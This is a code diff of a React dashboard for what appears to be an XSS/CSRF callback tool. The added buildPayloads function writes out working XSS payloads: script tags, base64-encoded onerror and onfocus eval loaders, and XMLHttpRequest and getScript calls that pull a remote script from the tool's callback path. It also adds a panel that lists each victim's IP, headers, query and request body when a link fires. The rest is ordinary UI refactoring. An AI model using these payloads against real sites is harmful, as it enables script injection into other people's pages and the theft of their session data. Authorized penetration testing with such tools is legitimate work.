@@ -10,12 +10,21 @@ import {
   Stack,
   Text,
   Textarea,
+  Toaster,
+  createToaster,
+  Toast,
 } from "@chakra-ui/react";
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
+// import { encode } from "html-entities";
 import {
   useCreateCsrfPayloadMutation,
   useGetMeQuery,
+  useLazyGetCallbackQuery,
+  useDeleteCallbackMutation,
   useListCsrfPayloadsQuery,
+  useListCallbacksQuery,
+  useLogoutMutation,
   useUpdateUserMutation,
 } from "../store/api";
 
@@ -34,17 +43,63 @@ const CSRF_Example = `
 </html>
 `;
 
+const toaster = createToaster({ placement: "top-end" });
+const DEFAULT_JS_PAYLOAD = "alert(document.domain)";
+
+function buildPayloads(js: string, xssPathValue: string) {
+  if (!js) {
+    return { linkPayloads: [] as string[], basicPayloads: [] as string[] };
+  }
+
+  const userLink =
+    window.location.protocol + "//" + window.location.host + xssPathValue;
+
+  const userb64Payload = btoa(
+    `var a=document.createElement("script");a.src="${userLink}";document.body.appendChild(a);`,
+  );
+
+  const linkPayloads = [
+    `"><script src=${userLink}></script>`,
+    `javascript:eval('var a=document.createElement('script');a.src='${userLink}';document.body.appendChild(a)')`,
+    `"><input onfocus=eval(atob(this.id)) id=${userb64Payload} autofocus>`,
+    `"><img src=x id=${userb64Payload} onerror=eval(atob(this.id))>`,
+    `"><video><source onerror=eval(atob(this.id)) id=${userb64Payload}>`,
+    `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${window.location.host + xssPathValue}");a.send();</script>`,
+    `<script>$.getScript("//${window.location.host + xssPathValue}")</script>`,
+  ];
+
+  const basicPayloads = [
+    `'><script>${js}</script>`,
+    `"><img src=x onerror="${js}">`,
+    `and more, you are hacker! :)`,
+  ];
+
+  return { linkPayloads, basicPayloads };
+}
+
 function MainPage() {
-  const { data, isLoading } = useGetMeQuery();
+  const navigate = useNavigate();
+  const { data, isLoading, refetch } = useGetMeQuery();
+  const [logout] = useLogoutMutation();
   const [updateUser, { isLoading: isSaving }] = useUpdateUserMutation();
   const [createCsrfPayload, { isLoading: isSavingCsrf }] =
     useCreateCsrfPayloadMutation();
   const { data: csrfListData } = useListCsrfPayloadsQuery();
-  const defaultCsrfPayload =
-    csrfListData?.items?.[0]?.payload ?? CSRF_Example;
+  const {
+    data: callbacksData,
+    refetch: refetchCallbacks,
+  } = useListCallbacksQuery(undefined, { pollingInterval: 5000 });
+  const [fetchCallback, { data: callbackDetail, isFetching: isCallbackLoading }] =
+    useLazyGetCallbackQuery();
+  const [deleteCallback] = useDeleteCallbackMutation();
+  const [isRefreshingCallbacks, setIsRefreshingCallbacks] = useState(false);
+  const [selectedCallbackId, setSelectedCallbackId] = useState<number | null>(
+    null,
+  );
+  const defaultCsrfPayload = csrfListData?.items?.[0]?.payload ?? CSRF_Example;
 
-  const [xssPath, setXssPath] = useState("");
-  const [csrfPath, setCsrfPath] = useState("");
+  const [draftXssPath, setDraftXssPath] = useState("");
+  const [draftCsrfPath, setDraftCsrfPath] = useState("");
   const [editingPaths, setEditingPaths] = useState(false);
 
   const [oldPassword, setOldPassword] = useState("");
@@ -53,16 +108,23 @@ function MainPage() {
   const [passwordError, setPasswordError] = useState<string | null>(null);
 
   const [csrfPayload, setCsrfPayload] = useState("");
-  const [jsPayload, setJsPayload] = useState("");
+  const [jsPayload, setJsPayload] = useState(DEFAULT_JS_PAYLOAD);
+  const [generatedLinkPayloads, setGeneratedLinkPayloads] = useState<string[]>(
+    () => buildPayloads(DEFAULT_JS_PAYLOAD, "").linkPayloads,
+  );
+  const [generatedBasicPayloads, setGeneratedBasicPayloads] = useState<
+    string[]
+  >(() => buildPayloads(DEFAULT_JS_PAYLOAD, "").basicPayloads);
   const [csrfError, setCsrfError] = useState<string | null>(null);
 
   async function handleSavePaths() {
     if (!data?.user) return;
     await updateUser({
       nickname: data.user.nickname,
-      xssPath,
-      csrfPath,
+      xssPath: draftXssPath,
+      csrfPath: draftCsrfPath,
     }).unwrap();
+    await refetch();
     setEditingPaths(false);
   }
 
@@ -117,127 +179,55 @@ function MainPage() {
   }
 
   const user = data.user;
-  const displayedXssPath = editingPaths ? xssPath : user.xssPath;
-  const displayedCsrfPath = editingPaths ? csrfPath : user.csrfPath;
+  const displayedXssPath = editingPaths ? draftXssPath : user.xssPath;
+  const displayedCsrfPath = editingPaths ? draftCsrfPath : user.csrfPath;
+  function handleJsPayloadChange(value: string) {
+    setJsPayload(value);
+    const { linkPayloads, basicPayloads } = buildPayloads(value, draftXssPath);
+    setGeneratedLinkPayloads(linkPayloads);
+    setGeneratedBasicPayloads(basicPayloads);
+  }
+
+  function notifyCopied() {
+    toaster.create({
+      title: "Copied",
+      duration: 1500,
+    });
+  }
+
+  const selectedCallback =
+    selectedCallbackId && callbackDetail?.item?.id === selectedCallbackId
+      ? callbackDetail.item
+      : null;
 
   return (
     <Box bg="gray.50" minH="100vh" py="6">
+      <Toaster toaster={toaster}>
+        {(toast) => (
+          <Toast.Root>
+            <Toast.Title>{toast.title}</Toast.Title>
+            <Toast.CloseTrigger />
+          </Toast.Root>
+        )}
+      </Toaster>
       <Container maxW="full" px={{ base: "2", md: "3", xl: "4" }}>
         <Stack gap="6">
-          <Heading size="lg">Dashboard</Heading>
+          <Flex align="center" justify="space-between">
+            <Heading size="lg">Dashboard</Heading>
+            <Button
+              variant="outline"
+              size="sm"
+              onClick={async () => {
+                await logout().unwrap();
+                navigate("/login");
+              }}
+            >
+              Logout
+            </Button>
+          </Flex>
 
-          <Grid templateColumns={"repeat(11, 1fr)"} gap="6">
-            <GridItem colSpan={2}>
-              <Box
-                bg="white"
-                borderRadius="xl"
-                borderWidth="1px"
-                p="6"
-                boxShadow="sm"
-              >
-                <Stack gap="4">
-                  <Heading size="md">Callback paths</Heading>
-
-                  <Stack gap="2">
-                    <Text fontSize="sm" color="gray.600">
-                      XSS callback
-                    </Text>
-                    <Input
-                      value={displayedXssPath}
-                      onChange={(event) => setXssPath(event.target.value)}
-                      disabled={!editingPaths}
-                    />
-                  </Stack>
-
-                  <Stack gap="2">
-                    <Text fontSize="sm" color="gray.600">
-                      CSRF callback
-                    </Text>
-                    <Input
-                      value={displayedCsrfPath}
-                      onChange={(event) => setCsrfPath(event.target.value)}
-                      disabled={!editingPaths}
-                    />
-                  </Stack>
-
-                  <Flex gap="3">
-                    {editingPaths ? (
-                      <>
-                        <Button
-                          colorScheme="blue"
-                          onClick={handleSavePaths}
-                          loading={isSaving}
-                        >
-                          Save
-                        </Button>
-                        <Button
-                          variant="ghost"
-                          onClick={() => {
-                            setXssPath(user.xssPath);
-                            setCsrfPath(user.csrfPath);
-                            setEditingPaths(false);
-                          }}
-                        >
-                          Cancel
-                        </Button>
-                      </>
-                    ) : (
-                      <Button
-                        variant="outline"
-                        onClick={() => {
-                          setXssPath(user.xssPath);
-                          setCsrfPath(user.csrfPath);
-                          setEditingPaths(true);
-                        }}
-                      >
-                        Edit
-                      </Button>
-                    )}
-                  </Flex>
-
-                  <Box borderTopWidth="1px" pt="4">
-                    <Heading size="sm" mb="3">
-                      Change password
-                    </Heading>
-                    <Stack gap="3">
-                      <Input
-                        type="password"
-                        placeholder="Old password"
-                        value={oldPassword}
-                        onChange={(event) => setOldPassword(event.target.value)}
-                      />
-                      <Input
-                        type="password"
-                        placeholder="New password"
-                        value={newPassword}
-                        onChange={(event) => setNewPassword(event.target.value)}
-                      />
-                      <Input
-                        type="password"
-                        placeholder="Confirm new password"
-                        value={confirmPassword}
-                        onChange={(event) =>
-                          setConfirmPassword(event.target.value)
-                        }
-                      />
-                      {passwordError ? (
-                        <Text fontSize="sm" color="red.500">
-                          {passwordError}
-                        </Text>
-                      ) : null}
-                      <Button
-                        colorScheme="blue"
-                        onClick={handleChangePassword}
-                        loading={isSaving}
-                      >
-                        Update password
-                      </Button>
-                    </Stack>
-                  </Box>
-                </Stack>
-              </Box>
-            </GridItem>
-            <GridItem colSpan={3}>
+          <Grid templateColumns={{ base: "1fr", lg: "repeat(3, 1fr)" }} gap="6">
+            <GridItem>
               <Box
                 bg="white"
                 borderRadius="xl"
@@ -268,8 +258,127 @@ function MainPage() {
                 </Stack>
               </Box>
             </GridItem>
+            <GridItem>
+              <Box
+                bg="white"
+                borderRadius="xl"
+                borderWidth="1px"
+                p="6"
+                boxShadow="sm"
+              >
+                <Stack gap="4">
+                  <Heading size="md">Callback paths</Heading>
 
-            <GridItem colSpan={3}>
+                  <Stack gap="2">
+                    <Text fontSize="sm" color="gray.600">
+                      XSS callback
+                    </Text>
+                    <Input
+                      value={displayedXssPath}
+                      onChange={(event) => setDraftXssPath(event.target.value)}
+                      disabled={!editingPaths}
+                    />
+                  </Stack>
+
+                  <Stack gap="2">
+                    <Text fontSize="sm" color="gray.600">
+                      CSRF callback
+                    </Text>
+                    <Input
+                      value={displayedCsrfPath}
+                      onChange={(event) => setDraftCsrfPath(event.target.value)}
+                      disabled={!editingPaths}
+                    />
+                  </Stack>
+
+                  <Flex gap="3">
+                    {editingPaths ? (
+                      <>
+                        <Button
+                          colorScheme="blue"
+                          onClick={handleSavePaths}
+                          loading={isSaving}
+                        >
+                          Save
+                        </Button>
+                        <Button
+                          variant="ghost"
+                          onClick={() => {
+                            setDraftXssPath(user.xssPath);
+                            setDraftCsrfPath(user.csrfPath);
+                            setEditingPaths(false);
+                          }}
+                        >
+                          Cancel
+                        </Button>
+                      </>
+                    ) : (
+                      <Button
+                        variant="outline"
+                        onClick={() => {
+                          setDraftXssPath(user.xssPath);
+                          setDraftCsrfPath(user.csrfPath);
+                          setEditingPaths(true);
+                        }}
+                      >
+                        Edit
+                      </Button>
+                    )}
+                  </Flex>
+                </Stack>
+              </Box>
+            </GridItem>
+            <GridItem>
+              <Box
+                bg="white"
+                borderRadius="xl"
+                borderWidth="1px"
+                p="6"
+                boxShadow="sm"
+              >
+                <Stack gap="4">
+                  <Heading size="md">Change password</Heading>
+                  <Stack gap="3">
+                    <Input
+                      type="password"
+                      placeholder="Old password"
+                      value={oldPassword}
+                      onChange={(event) => setOldPassword(event.target.value)}
+                    />
+                    <Input
+                      type="password"
+                      placeholder="New password"
+                      value={newPassword}
+                      onChange={(event) => setNewPassword(event.target.value)}
+                    />
+                    <Input
+                      type="password"
+                      placeholder="Confirm new password"
+                      value={confirmPassword}
+                      onChange={(event) =>
+                        setConfirmPassword(event.target.value)
+                      }
+                    />
+                    {passwordError ? (
+                      <Text fontSize="sm" color="red.500">
+                        {passwordError}
+                      </Text>
+                    ) : null}
+                    <Button
+                      variant="outline"
+                      onClick={handleChangePassword}
+                      loading={isSaving}
+                    >
+                      Update password
+                    </Button>
+                  </Stack>
+                </Stack>
+              </Box>
+            </GridItem>
+          </Grid>
+
+          <Grid templateColumns={{ base: "1fr", xl: "3fr 1fr" }} gap="6">
+            <GridItem>
               <Box
                 bg="white"
                 borderRadius="xl"
@@ -283,21 +392,70 @@ function MainPage() {
                     minH="140px"
                     placeholder="Write JS payload here"
                     value={jsPayload}
-                    onChange={(event) => setJsPayload(event.target.value)}
+                    onChange={(event) =>
+                      handleJsPayloadChange(event.target.value)
+                    }
                   />
-                  <Textarea
-                    minH="180px"
-                    placeholder="Generated XSS payloads will appear here"
-                    value=""
-                    readOnly
-                  />
+                  <Stack gap="3">
+                    {generatedLinkPayloads.length > 0 ? (
+                      <>
+                        <Text fontSize="sm" color="gray.600">
+                          Generated link payloads
+                        </Text>
+                        {generatedLinkPayloads.map((payload, index) => (
+                          <Flex
+                            key={`link-${index}-${payload.slice(0, 8)}`}
+                            gap="2"
+                            align="center"
+                          >
+                            <Input value={payload} readOnly />
+                            <Button
+                              size="sm"
+                              variant="outline"
+                              onClick={() => {
+                                navigator.clipboard.writeText(payload);
+                                notifyCopied();
+                              }}
+                            >
+                              Copy
+                            </Button>
+                          </Flex>
+                        ))}
+                      </>
+                    ) : null}
+                    {generatedBasicPayloads.length === 0 ? (
+                      <Text fontSize="sm" color="gray.600">
+                        Generated Basic XSS payloads will appear below.
+                      </Text>
+                    ) : (
+                      generatedBasicPayloads.map((payload, index) => (
+                        <Flex
+                          key={`${index}-${payload.slice(0, 8)}`}
+                          gap="2"
+                          align="center"
+                        >
+                          <Input value={payload} readOnly />
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            onClick={() => {
+                              navigator.clipboard.writeText(payload);
+                              notifyCopied();
+                            }}
+                          >
+                            Copy
+                          </Button>
+                        </Flex>
+                      ))
+                    )}
+                  </Stack>
                   <Text fontSize="xs" color="gray.500">
                     JS payload is stored in local state for now.
                   </Text>
                 </Stack>
               </Box>
             </GridItem>
-            <GridItem colSpan={3}>
+            <GridItem>
               <Box
                 bg="white"
                 borderRadius="xl"
@@ -306,12 +464,121 @@ function MainPage() {
                 boxShadow="sm"
               >
                 <Stack gap="4">
-                  <Heading size="md">Callback activity</Heading>
+                  <Flex align="center" justify="space-between">
+                    <Heading size="md">Callback activity</Heading>
+                    <Button
+                      size="sm"
+                      variant="outline"
+                      onClick={async () => {
+                        setIsRefreshingCallbacks(true);
+                        try {
+                          await refetchCallbacks();
+                        } finally {
+                          setIsRefreshingCallbacks(false);
+                        }
+                      }}
+                      loading={isRefreshingCallbacks}
+                    >
+                      Refresh
+                    </Button>
+                  </Flex>
                   <Text fontSize="sm" color="gray.600">
                     Here you will see if someone opened your CSRF/XSS links.
                   </Text>
                   <Stack gap="3" fontSize="sm" color="gray.700">
-                    <Text>No events yet.</Text>
+                    {callbacksData?.items?.length ? (
+                      callbacksData.items.slice(0, 10).map((item) => (
+                        <Flex key={item.id} direction="column" gap="1">
+                          <Flex align="center" justify="space-between" gap="2">
+                            <Text>
+                              [{item.type.toUpperCase()}] {item.method} {item.path}
+                            </Text>
+                            <Flex gap="2">
+                              <Button
+                                size="xs"
+                                variant="outline"
+                                onClick={() => {
+                                  setSelectedCallbackId(item.id);
+                                  fetchCallback(item.id);
+                                }}
+                                loading={
+                                  isCallbackLoading &&
+                                  selectedCallbackId === item.id
+                                }
+                              >
+                                View
+                              </Button>
+                              <Button
+                                size="xs"
+                                variant="outline"
+                                onClick={() => deleteCallback(item.id)}
+                              >
+                                Delete
+                              </Button>
+                            </Flex>
+                          </Flex>
+                          <Text fontSize="xs" color="gray.500">
+                            {new Date(item.createdAt).toLocaleString()} ? IP:{" "}
+                            {item.ip ?? "unknown"}
+                          </Text>
+                          {selectedCallbackId === item.id && selectedCallback ? (
+                            <Box
+                              mt="2"
+                              p="2"
+                              bg="gray.50"
+                              borderWidth="1px"
+                              borderRadius="md"
+                              fontSize="xs"
+                            >
+                              <Flex align="center" justify="space-between" gap="2">
+                                <Text fontWeight="bold">Details</Text>
+                                <Button
+                                  size="xs"
+                                  variant="outline"
+                                  onClick={() => setSelectedCallbackId(null)}
+                                >
+                                  Hide
+                                </Button>
+                              </Flex>
+                              <Text>URL: {selectedCallback.path}</Text>
+                              <Text>Method: {selectedCallback.method}</Text>
+                              <Text>IP: {selectedCallback.ip ?? "unknown"}</Text>
+                              <Text>
+                                User-Agent: {selectedCallback.userAgent ?? "-"}
+                              </Text>
+                              <Text mt="2" fontWeight="bold">
+                                Headers
+                              </Text>
+                              <Box as="pre" whiteSpace="pre-wrap">
+                                {JSON.stringify(
+                                  selectedCallback.headers ?? {},
+                                  null,
+                                  2,
+                                )}
+                              </Box>
+                              <Text mt="2" fontWeight="bold">
+                                Query
+                              </Text>
+                              <Box as="pre" whiteSpace="pre-wrap">
+                                {JSON.stringify(
+                                  selectedCallback.query ?? {},
+                                  null,
+                                  2,
+                                )}
+                              </Box>
+                              <Text mt="2" fontWeight="bold">
+                                Body
+                              </Text>
+                              <Box as="pre" whiteSpace="pre-wrap">
+                                {selectedCallback.body ?? ""}
+                              </Box>
+                            </Box>
+                          ) : null}
+                        </Flex>
+                      ))
+                    ) : (
+                      <Text>No events yet.</Text>
+                    )}
                   </Stack>
                 </Stack>
               </Box>
